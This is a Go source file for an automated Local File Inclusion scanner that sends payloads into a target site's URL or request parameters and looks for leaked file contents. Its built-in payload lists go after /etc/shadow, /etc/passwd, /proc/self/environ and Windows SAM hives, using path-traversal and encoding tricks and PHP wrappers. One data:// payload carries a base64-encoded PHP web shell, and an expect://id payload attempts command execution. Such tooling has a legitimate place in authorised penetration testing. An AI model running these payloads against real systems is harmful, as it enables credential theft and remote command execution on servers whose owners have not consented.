package scanner

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

// Config holds the scanner configuration
type Config struct {
	TargetURL       string
	ParamsList      []string
	ScanAllParams   bool
	Wordlist        string
	Threads         int
	Timeout         int
	Verbose         bool
	OutputFile      string
	Cookies         string
	Headers         string
	Depth           int
	RequestFile     string   // Path to a request file (e.g., from Burp)
	IgnoreSignatures []string // Signatures to ignore during scanning (to filter out false positives)
}

// Result represents a found vulnerability
type Result struct {
	URL         string `json:"url"`
	Parameter   string `json:"parameter"`
	Payload     string `json:"payload"`
	Evidence    string `json:"evidence"`
	StatusCode  int    `json:"status_code"`  // HTTP status code of the response
	ContentType string `json:"content_type"` // Content-Type of the response
}

// Scanner represents the LFI vulnerability scanner
type Scanner struct {
	config       Config
	client       *http.Client
	payloads     []string
	headers      map[string]string
	statusCounts map[int]int
	transport    *http.Transport // Add explicit transport for better connection management
	mu           sync.Mutex      // Add mutex for concurrent map access protection
}

// NewScanner creates a new scanner instance
func NewScanner(config Config) *Scanner {
	// Setup HTTP client with timeout and improved connection management
	transport := &http.Transport{
		MaxIdleConns:          100,                                      // Increase from 10
		MaxIdleConnsPerHost:   100,                                      // Increase from 5
		IdleConnTimeout:       20 * time.Second,
		TLSHandshakeTimeout:   10 * time.Second,
		ResponseHeaderTimeout: time.Duration(config.Timeout) * time.Second,
		ExpectContinueTimeout: 5 * time.Second,
		DisableKeepAlives:     false,                                     // Enable keep-alives for connection reuse
		MaxConnsPerHost:       config.Threads * 2,                        // Limit based on threads
		ForceAttemptHTTP2:     false,                                     // Disable HTTP/2 to avoid related goroutine leaks
		DisableCompression:    true,                                      // Disable compression to avoid some issues
	}
	
	client := &http.Client{
		Timeout:   time.Duration(config.Timeout) * time.Second,
		Transport: transport,
	}

	// Parse headers if provided
	headers := make(map[string]string)
	if config.Headers != "" {
		headersList := strings.Split(config.Headers, ",")
		for _, header := range headersList {
			parts := strings.SplitN(header, ":", 2)
			if len(parts) == 2 {
				headers[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
			}
		}
	}

	scanner := &Scanner{
		config:       config,
		client:       client,
		headers:      headers,
		payloads:     []string{},
		statusCounts: make(map[int]int),
		transport:    transport,
		mu:           sync.Mutex{}, // Initialize mutex
	}

	// Load payloads
	scanner.loadPayloads()
	return scanner
}

// loadPayloads loads LFI payloads from wordlist or uses default list
func (s *Scanner) loadPayloads() {
	if s.config.Wordlist != "" {
		// Load payloads from file
		file, err := os.Open(s.config.Wordlist)
		if err != nil {
			fmt.Printf("Error opening wordlist file: %s\n", err)
			s.loadDefaultPayloads()
			return
		}
		defer file.Close()

		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			payload := scanner.Text()
			if payload != "" && !strings.HasPrefix(payload, "#") {
				s.payloads = append(s.payloads, payload)
			}
		}

		if err := scanner.Err(); err != nil {
			fmt.Printf("Error reading from wordlist: %s\n", err)
			s.loadDefaultPayloads()
		}
	} else {
		s.loadDefaultPayloads()
	}

	// Generate dynamic path traversal payloads based on depth
	s.generatePathTraversalPayloads()
}

// loadDefaultPayloads loads a set of default LFI payloads
func (s *Scanner) loadDefaultPayloads() {
	// Common LFI payloads
	defaultPayloads := []string{
		// Original payloads
		"/etc/passwd",
		"/etc/shadow",
		"/etc/hosts",
		"/etc/hostname",
		"/etc/issue",
		"/etc/group",
		"/etc/nginx/nginx.conf",
		"/etc/httpd/conf/httpd.conf",
		"/etc/apache2/apache2.conf",
		"/proc/self/environ",
		"/proc/self/cmdline",
		"/proc/self/status",
		"C:/Windows/system.ini",
		"C:/Windows/win.ini",
		"C:/boot.ini",
		"C:/inetpub/wwwroot/web.config",
		"/var/log/apache/access.log",
		"/var/log/apache2/access.log",
		"/var/log/nginx/access.log",
		"/var/log/httpd/access_log",
		"../../../../../../../etc/passwd",
		"..\\..\\..\\..\\..\\..\\Windows\\system.ini",

		// Added payloads from payloadbox/rfi-lfi-payload-list
		"/etc/passwd%00",
		"///etc///passwd",
		"..././..././..././..././..././..././etc/passwd",
		"/etc/passwd%00",
		"../../../../../../../../../../../../etc/passwd",
		"../../../etc/passwd%00.jpg",
		"../../../etc/passwd%00.html",
		"../../../../../../../../../../../../etc/passwd%00.jpg",
		"....//....//....//....//....//....//....//....//....//....//etc/passwd",
		"/etc/passwd%0a",
		
		// PHP wrapper payloads (we'll add more with generatePHPWrapperPayloads)
		"php://filter/convert.base64-encode/resource=/etc/passwd",
		"php://filter/read=convert.base64-encode/resource=/etc/passwd",
		"php://filter/resource=/etc/passwd",
		"php://filter/convert.base64-encode/resource=../../../../../etc/passwd",
		"php://input%00",
		"php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd",
		"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
		"expect://id",
		"phar://pharfile.jpg/file.php",
		"zip://zipfile.jpg%23file.php",

		// Windows specific payloads
		"C:\\Windows\\system.ini",
		"C:\\Windows\\win.ini",
		"C:\\Windows\\repair\\sam",
		"C:\\Windows\\repair\\system",
		"C:\\Windows\\repair\\software",
		"C:\\Windows\\repair\\security",
		"C:\\Windows\\debug\\NetSetup.log",
		"C:\\Windows\\iis5.log",
		"C:\\Windows\\iis6.log",
		"C:\\Windows\\iis7.log",
		"C:\\Windows\\system32\\config\\AppEvent.Evt",
		"C:\\Windows\\system32\\config\\SecEvent.Evt",
		"C:\\Windows\\system32\\config\\default.sav",
		"C:\\Windows\\system32\\config\\security.sav",
		"C:\\Windows\\system32\\config\\software.sav",
		"C:\\Windows\\system32\\config\\system.sav",
		"C:\\Windows\\system32\\inetsrv\\config\\applicationHost.config",
		"C:\\inetpub\\logs\\LogFiles",
		"C:\\Program Files\\Apache Group\\Apache\\logs\\access.log",
		"C:\\Program Files\\Apache Group\\Apache\\logs\\error.log",

		// Log files
		"/var/log/sshd.log",
		"/var/log/mail.log",
		"/var/log/mysql.log",
		"/var/log/mysql/mysql.log",
		"/var/log/mysql/mysql-slow.log",
		"/var/log/mysqld.log",
		"/var/log/auth.log",
		"/var/log/secure",
		"/var/log/boot.log",
		"/var/log/maillog",
		"/var/log/faillog",
		"/var/log/cron",
		"/var/log/messages",

		// Apache config files
		"/usr/local/etc/apache2/httpd.conf",
		"/usr/local/apache/conf/httpd.conf",
		"/usr/local/apache2/conf/httpd.conf",
		"/etc/apache2/sites-available/000-default.conf",
		"/etc/apache2/sites-enabled/000-default.conf",

		// PHP files
		"/usr/local/etc/php.ini",
		"/etc/php.ini",
		"/etc/php/php.ini",
		"/etc/php5/apache2/php.ini",
		"/etc/php5/cli/php.ini",
		"/etc/php5/cgi/php.ini",
		"/etc/php5/fpm/php.ini",
		"/etc/php7/php.ini",
		"/etc/php7/apache2/php.ini",
		"/etc/php7/cli/php.ini",
		"/etc/php7/cgi/php.ini",
		"/etc/php7/fpm/php.ini",

		// Proc entries
		"/proc/self/fd/0",
		"/proc/self/fd/1",
		"/proc/self/fd/2",
		"/proc/self/fd/3",
		"/proc/self/fd/4",
		"/proc/self/fd/5",
		"/proc/self/fd/6",
		"/proc/self/fd/7",
		"/proc/self/fd/8",
		"/proc/self/fd/9",
		"/proc/self/fd/10",
		"/proc/self/fd/11",
		"/proc/self/fd/12",
		"/proc/self/environ",
		"/proc/cmdline",
		"/proc/mounts",
		"/proc/config.gz",
	}

	s.payloads = defaultPayloads
	
	// Generate PHP wrapper payloads with all target files
	phpWrapperPayloads := s.generatePHPWrapperPayloads(defaultPayloads)
	s.payloads = append(s.payloads, phpWrapperPayloads...)
}

// generatePHPWrapperPayloads creates PHP filter and data wrapper payloads for all target files
func (s *Scanner) generatePHPWrapperPayloads(targetFiles []string) []string {
	// PHP wrapper types to use
	wrappers := []string{
		"php://filter/convert.base64-encode/resource=%s",
		"php://filter/read=convert.base64-encode/resource=%s",
		"php://filter/resource=%s",
		"php://filter/zlib.deflate/convert.base64-encode/resource=%s",
		"php://filter/convert.iconv.utf-8.utf-16/resource=%s",
		"php://filter/convert.base64-decode/resource=%s",
		"phar://%s",
		"zip://%s",
	}
	
	// Collect traversal variations
	traversals := []string{
		"", // No traversal
		"../",
		"../../",
		"../../../",
		"../../../../",
		"../../../../../",
	}
	
	var payloads []string
	
	// For each PHP wrapper
	for _, wrapper := range wrappers {
		// Add different traversal depths for each target file
		for _, targetFile := range targetFiles {
			// Skip if it's already a PHP wrapper payload
			if strings.HasPrefix(targetFile, "php://") || 
			   strings.HasPrefix(targetFile, "data://") || 
			   strings.HasPrefix(targetFile, "phar://") || 
			   strings.HasPrefix(targetFile, "zip://") ||
			   strings.HasPrefix(targetFile, "expect://") {
				continue
			}
			
			// Clean up the target path by removing any existing traversal or root indicators
			cleanTarget := targetFile
			cleanTarget = strings.TrimPrefix(cleanTarget, "/")
			cleanTarget = strings.TrimPrefix(cleanTarget, "C:")
			cleanTarget = strings.TrimPrefix(cleanTarget, "\\")
			cleanTarget = strings.TrimPrefix(cleanTarget, "/")
			
			// Skip empty paths
			if cleanTarget == "" {
				continue
			}
			
			// Create the standard version
			payload := fmt.Sprintf(wrapper, targetFile)
			payloads = append(payloads, payload)
			
			// Try with null byte (PHP < 5.3.4)
			payloads = append(payloads, payload + "%00")
			
			// Add traversal variations for non-absolute paths
			if !strings.HasPrefix(targetFile, "/") && !strings.Contains(targetFile, ":\\") {
				for _, traversal := range traversals {
					traversalPayload := fmt.Sprintf(wrapper, traversal+cleanTarget)
					payloads = append(payloads, traversalPayload)
					
					// With null byte
					payloads = append(payloads, traversalPayload + "%00")
				}
			}
		}
	}
	
	// Add more specialized payloads
	payloads = append(payloads, []string{
		// Data wrapper with PHP shell
		"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=",
		// PHP input wrapper
		"php://input",
		"php://input%00",
		// Expect wrapper (system command execution)
		"expect://id",
		"expect://ls",
	}...)
	
	return payloads
}

// generatePathTraversalPayloads generates path traversal payloads with different depths
func (s *Scanner) generatePathTraversalPayloads() {
	sensitiveFiles := []string{
		"etc/passwd", "etc/shadow", "etc/hosts",
		"Windows/system.ini", "Windows/win.ini", "boot.ini",
	}

	// Add URL encoding variations
	encodingVariations := []struct {
		name       string
		traversal  string
		encodedDir string
	}{
		{"standard", "../", "../"},
		{"double_encoded", "../", "%252e%252e%252f"},
		{"encoded", "../", "%2e%2e%2f"},
		{"windows_backslash", "..\\", "..\\"},
		{"windows_encoded", "..\\", "%2e%2e\\"},
		{"null_byte", "../", "../%00"},
	}

	// Generate payloads with different traversal techniques and depths
	var dynamicPayloads []string
	for _, file := range sensitiveFiles {
		for _, enc := range encodingVariations {
			// Generate with different depths
			for depth := 1; depth <= s.config.Depth; depth++ {
				traversal := strings.Repeat(enc.traversal, depth)
				payload := traversal + file

				// Add variations with null byte and different encodings
				dynamicPayloads = append(dynamicPayloads, payload)
				if enc.name == "standard" {
					dynamicPayloads = append(dynamicPayloads, payload+"%00")
					dynamicPayloads = append(dynamicPayloads, payload+"?")
					dynamicPayloads = append(dynamicPayloads, payload+"#")
				}
			}
		}
	}

	// Add these dynamic payloads to the existing ones
	s.payloads = append(s.payloads, dynamicPayloads...)
}

// CloseIdleConnections closes any idle connections in the connection pool
func (s *Scanner) CloseIdleConnections() {
	if s.transport != nil {
		s.transport.CloseIdleConnections()
	}
}

// Run executes the LFI vulnerability scan
func (s *Scanner) Run() []Result {
	var results []Result
	var targetURL string
	var requestInfo *RequestInfo
	
	// Defer cleanup of idle connections
	defer s.CloseIdleConnections()

	// Check if we're using a request file or a target URL
	if s.config.RequestFile != "" {
		// Parse the request file
		var err error
		requestInfo, err = ParseRequestFile(s.config.RequestFile)
		if err != nil {
			fmt.Printf("Error parsing request file: %s\n", err)
			return results
		}

		targetURL = requestInfo.URL

		// Set cookies from request if not specified via command line
		if s.config.Cookies == "" && requestInfo.Cookies != "" {
			// Add cookies from the request file to the headers
			s.headers["Cookie"] = requestInfo.Cookies
		}

		// Add headers from request if not already set via command line
		for k, v := range requestInfo.Headers {
			if _, exists := s.headers[k]; !exists {
				s.headers[k] = v
			}
		}

		if s.config.Verbose {
			fmt.Printf("Parsed request file: %s %s\n", requestInfo.Method, targetURL)
			fmt.Printf("Found %d query parameters, %d form parameters\n",
				len(requestInfo.QueryParams), len(requestInfo.FormParams))
		}
	} else {
		// Using target URL
		targetURL = s.config.TargetURL
	}

	// Get list of parameters to test
	var paramsToTest []string
	if len(s.config.ParamsList) > 0 {
		// Use specified parameters
		paramsToTest = s.config.ParamsList
	} else if requestInfo != nil {
		// Auto-discover parameters from request
		if s.config.Verbose {
			fmt.Println("Extracting parameters from request file...")
		}
		paramsToTest = GetParametersFromRequest(requestInfo)

		// If no parameters were found or user wants to test additional ones
		if len(paramsToTest) == 0 {
			fmt.Println("No parameters found in the request. Would you like to test with common parameter names? (y/n)")
			var response string
			fmt.Scanln(&response)
			if strings.HasPrefix(strings.ToLower(response), "y") {
				paramsToTest = s.ParameterDiscovery(targetURL)
			}
		} else {
			fmt.Printf("Found the following parameters in the request: %s\n", strings.Join(paramsToTest, ", "))
			fmt.Println("Would you like to test only these parameters? (y/n)")
			var response string
			fmt.Scanln(&response)
			if !strings.HasPrefix(strings.ToLower(response), "y") {
				fmt.Println("Would you like to add common parameter names to test as well? (y/n)")
				fmt.Scanln(&response)
				if strings.HasPrefix(strings.ToLower(response), "y") {
					// Add common parameters
					commonParams := s.ParameterDiscovery(targetURL)
					for _, param := range commonParams {
						if !containsParam(paramsToTest, param) {
							paramsToTest = append(paramsToTest, param)
						}
					}
				}
			}
		}
	} else {
		// Auto-discover parameters from URL
		if s.config.Verbose {
			fmt.Println("No specific parameters provided, auto-discovering parameters...")
		}
		paramsToTest = s.ParameterDiscovery(targetURL)
	}

	if s.config.Verbose {
		fmt.Printf("Testing %d parameters: %s\n", len(paramsToTest), strings.Join(paramsToTest, ", "))
	}

	// Create a workload of parameter + payload combinations
	type workItem struct {
		param   string
		payload string
	}

	var wg sync.WaitGroup
	resultsChan := make(chan Result)
	workerChan := make(chan workItem)

	// Start workers
	for i := 0; i < s.config.Threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for item := range workerChan {
				if requestInfo != nil {
					// Test using request file approach
					if result, found := s.testRequestPayload(requestInfo, item.param, item.payload); found {
						resultsChan <- result
					}
				} else {
					// Test using URL approach
					if result, found := s.testPayload(item.param, item.payload); found {
						resultsChan <- result
					}
				}
			}
		}()
	}

	// Collect results
	go func() {
		wg.Wait()
		close(resultsChan)
	}()

	// Send work to workers
	go func() {
		for _, param := range paramsToTest {
			for _, payload := range s.payloads {
				workerChan <- workItem{param: param, payload: payload}
			}
		}
		close(workerChan)
	}()

	// Collect results
	for result := range resultsChan {
		results = append(results, result)
	}

	return results
}

// testPayload tests a single LFI payload
func (s *Scanner) testPayload(paramName, payload string) (Result, bool) {
	// Prepare the request
	testURL, err := buildTestURL(s.config.TargetURL, paramName, payload)
	if err != nil {
		if s.config.Verbose {
			fmt.Printf("Error building URL for parameter %s with payload %s: %s\n",
				paramName, payload, err)
		}
		return Result{}, false
	}

	if s.config.Verbose {
		fmt.Printf("Testing parameter '%s' with payload: %s\n", paramName, payload)
	}

	// Create request
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(s.config.Timeout)*time.Second)
	defer cancel()

	// Add exponential backoff retry logic for connection errors
	var resp *http.Response
	var respErr error
	maxRetries := 3
	retryDelay := time.Millisecond * 100

	for retry := 0; retry < maxRetries; retry++ {
		req, err := http.NewRequestWithContext(ctx, "GET", testURL, nil)
		if err != nil {
			if s.config.Verbose {
				fmt.Printf("Error creating request: %s\n", err)
			}
			return Result{}, false
		}

		// Add headers
		for k, v := range s.headers {
			req.Header.Add(k, v)
		}

		// Add cookies if provided
		if s.config.Cookies != "" {
			req.Header.Add("Cookie", s.config.Cookies)
		}

		// Send request
		resp, respErr = s.client.Do(req)
		if respErr == nil {
			break // Success, exit retry loop
		}

		// If it's a connection issue, retry with backoff
		if retry < maxRetries-1 && isConnectionError(respErr) {
			if s.config.Verbose {
				fmt.Printf("%sConnection error, retrying (%d/%d): %s%s\n", 
					colorYellow, retry+1, maxRetries, respErr, colorReset)
			}
			// Wait before retrying
			select {
			case <-time.After(retryDelay):
				// Exponential backoff
				retryDelay *= 2
			case <-ctx.Done():
				// Context timeout reached
				if s.config.Verbose {
					fmt.Printf("%sRequest timeout during retry: %s%s\n", colorRed, ctx.Err(), colorReset)
				}
				return Result{}, false
			}
			continue
		}

		// Non-retriable error
		if s.config.Verbose {
			fmt.Printf("%sError sending request: %s%s\n", colorRed, respErr, colorReset)
		}
		return Result{}, false
	}

	// If all retries failed
	if respErr != nil {
		if s.config.Verbose {
			fmt.Printf("%sAll retries failed, error sending request: %s%s\n", colorRed, respErr, colorReset)
		}
		return Result{}, false
	}

	defer resp.Body.Close()

	// Track status code counts
	s.mu.Lock()
	s.statusCounts[resp.StatusCode]++
	s.mu.Unlock()

	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		if s.config.Verbose {
			fmt.Printf("%sError reading response: %s%s\n", colorRed, err, colorReset)
		}
		return Result{}, false
	}

	// Show status code in verbose mode
	if s.config.Verbose {
		statusColor := getStatusCodeColor(resp.StatusCode)
		fmt.Printf("[%s%d%s] %s (Parameter: %s, Payload: %s)\n",
			statusColor, resp.StatusCode, colorReset, testURL, paramName, payload)
	}

	// Check for evidence of successful LFI
	found, evidence := s.checkForLFIEvidence(payload, string(body))
	if found {
		return Result{
			URL:         testURL,
			Parameter:   paramName,
			Payload:     payload,
			Evidence:    evidence,
			StatusCode:  resp.StatusCode,
			ContentType: resp.Header.Get("Content-Type"),
		}, true
	}

	return Result{}, false
}

// testRequestPayload tests a single LFI payload using an imported request file
func (s *Scanner) testRequestPayload(reqInfo *RequestInfo, paramName, payload string) (Result, bool) {
	if s.config.Verbose {
		fmt.Printf("Testing parameter '%s' in request with payload: %s\n", paramName, payload)
	}

	// Create a new request with the payload
	req, err := CreateHTTPRequestFromRequestInfo(reqInfo, paramName, payload)
	if err != nil {
		if s.config.Verbose {
			fmt.Printf("%sError creating request with payload: %s%s\n", colorRed, err, colorReset)
		}
		return Result{}, false
	}

	// Add context with timeout
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(s.config.Timeout)*time.Second)
	defer cancel()
	req = req.WithContext(ctx)

	// Override with command-line headers if provided
	for k, v := range s.headers {
		req.Header.Set(k, v)
	}

	// Override with command-line cookies if provided
	if s.config.Cookies != "" {
		req.Header.Set("Cookie", s.config.Cookies)
	}

	// Send the request
	resp, err := s.client.Do(req)
	if err != nil {
		if s.config.Verbose {
			fmt.Printf("%sError sending request: %s%s\n", colorRed, err, colorReset)
		}
		return Result{}, false
	}
	defer resp.Body.Close()

	// Track status code counts
	s.mu.Lock()
	s.statusCounts[resp.StatusCode]++
	s.mu.Unlock()

	// Read response body
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		if s.config.Verbose {
			fmt.Printf("%sError reading response: %s%s\n", colorRed, err, colorReset)
		}
		return Result{}, false
	}

	// Show status code in verbose mode
	if s.config.Verbose {
		statusColor := getStatusCodeColor(resp.StatusCode)
		fmt.Printf("[%s%d%s] %s (Parameter: %s, Payload: %s)\n",
			statusColor, resp.StatusCode, colorReset, req.URL.String(), paramName, payload)
	}

	// Check for evidence of successful LFI
	found, evidence := s.checkForLFIEvidence(payload, string(body))
	if found {
		return Result{
			URL:         req.URL.String(),
			Parameter:   paramName,
			Payload:     payload,
			Evidence:    evidence,
			StatusCode:  resp.StatusCode,
			ContentType: resp.Header.Get("Content-Type"),
		}, true
	}

	return Result{}, false
}

// checkForLFIEvidence checks if the response contains evidence of a successful LFI
func (s *Scanner) checkForLFIEvidence(payload, responseBody string) (bool, string) {
	// LFI evidence patterns
	patterns := map[string][]string{
		"etc/passwd": {
			"root:x:", "nobody:x:", "daemon:x:", "/bin/bash",
		},
		"etc/shadow": {
			"root:$", "daemon:*",
		},
		"proc/self/environ": {
			"DOCUMENT_ROOT=", "SERVER_SOFTWARE=", "SCRIPT_NAME=",
		},
		"Windows/system.ini": {
			"[drivers]", "[mci]", "for 16-bit app support",
		},
		"Windows/win.ini": {
			"[fonts]", "[extensions]", "[files]",
		},
		// Additional patterns
		"boot.ini": {
			"[boot loader]", "[operating systems]", "multi(", "disk(", "rdisk(",
		},
		"apache": {
			"<Directory ", "DocumentRoot", "LoadModule", "ServerRoot", "ServerName",
		},
		"php.ini": {
			"allow_url_fopen", "allow_url_include", "disable_functions", "max_execution_time",
		},
		"proc/self": {
			"PID", "COMMAND", "UID", "GID", "FD", "USER", "COMMAND", "TTY",
		},
		"mysql": {
			"mysql>", "MySQL dump", "Dumping data for table", "INSERT INTO",
		},
	}

	// Look for specific signatures based on the payload
	for fileType, signatures := range patterns {
		if strings.Contains(payload, fileType) {
			for _, signature := range signatures {
				// Skip signatures that the user has asked to ignore
				if containsString(s.config.IgnoreSignatures, signature) {
					continue
				}
				
				if strings.Contains(responseBody, signature) {
					return true, fmt.Sprintf("Found signature '%s' in response", signature)
				}
			}
		}
	}

	// Generic indicators of successful LFI
	genericIndicators := []string{
		"root:x:", "#!/bin/", "apache_port", "mysql_port",
		"[boot loader]", "DOCUMENT_ROOT=", "HTTP_USER_AGENT",
		"lp:x:", "mail:x:", "nobody:x:", "sshd:x:",
		"allow_url_fopen", "allow_url_include", "safe_mode",
		"disable_functions", "open_basedir",
	}

	for _, indicator := range genericIndicators {
		// Skip indicators that the user has asked to ignore
		if containsString(s.config.IgnoreSignatures, indicator) {
			continue
		}
		
		if strings.Contains(responseBody, indicator) {
			return true, fmt.Sprintf("Found generic LFI indicator '%s'", indicator)
		}
	}

	return false, ""
}

// containsString checks if a string is in a slice of strings
func containsString(slice []string, s string) bool {
	for _, item := range slice {
		if item == s {
			return true
		}
	}
	return false
}

// SaveResults saves scan results to a file
func (s *Scanner) SaveResults(results []Result, filename string) error {
	file, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer file.Close()

	encoder := json.NewEncoder(file)
	encoder.SetIndent("", "  ")
	return encoder.Encode(results)
}

// buildTestURL builds a URL for testing a specific payload
func buildTestURL(baseURL, paramName, payload string) (string, error) {
	u, err := url.Parse(baseURL)
	if err != nil {
		return "", err
	}

	// Check if the parameter might be in the path (like /test=awg)
	pathContainsParam := false
	pathSegments := strings.Split(u.Path, "/")
	for i, segment := range pathSegments {
		if strings.Contains(segment, "=") {
			parts := strings.SplitN(segment, "=", 2)
			if len(parts) == 2 && parts[0] == paramName {
				// Found parameter in path, replace it
				pathSegments[i] = parts[0] + "=" + payload
				pathContainsParam = true
				break
			}
		}
	}

	if pathContainsParam {
		// Reconstruct the path with the modified parameter
		u.Path = strings.Join(pathSegments, "/")
		return u.String(), nil
	}

	// Parameter is not in the path, so it must be in the query string
	// or we're adding it to the query string
	q := u.Query()
	q.Set(paramName, payload)
	u.RawQuery = q.Encode()

	return u.String(), nil
}

// getStatusCodeColor returns the color for a given HTTP status code
func getStatusCodeColor(statusCode int) string {
	switch {
	case statusCode >= 200 && statusCode < 300:
		return colorGreen
	case statusCode >= 300 && statusCode < 400:
		return colorYellow
	case statusCode >= 400 && statusCode < 500:
		return colorRed
	case statusCode >= 500:
		return colorMagenta
	default:
		return colorReset
	}
}

// GetStatusCounts returns a map of HTTP status codes and their count during the scan
func (s *Scanner) GetStatusCounts() map[int]int {
	// Return a copy of the status counts map to prevent modification
	counts := make(map[int]int)
	s.mu.Lock()
	defer s.mu.Unlock()
	for code, count := range s.statusCounts {
		counts[code] = count
	}
	return counts
}

// isConnectionError determines if an error is a retriable connection error
func isConnectionError(err error) bool {
	if err == nil {
		return false
	}
	
	errorString := err.Error()
	
	// Check for common connection errors
	connectionErrors := []string{
		"connectex:", "connection refused", "timeout", "deadline exceeded",
		"connection reset", "connection closed", "EOF", "broken pipe",
		"use of closed network connection", "Only one usage of each socket address",
	}
	
	for _, errText := range connectionErrors {
		if strings.Contains(errorString, errText) {
			return true
		}
	}
	
	return false
}

// ANSI color codes for output
const (
	colorReset   = "\033[0m"
	colorRed     = "\033[31m"
	colorGreen   = "\033[32m"
	colorYellow  = "\033[33m"
	colorMagenta = "\033[35m"
)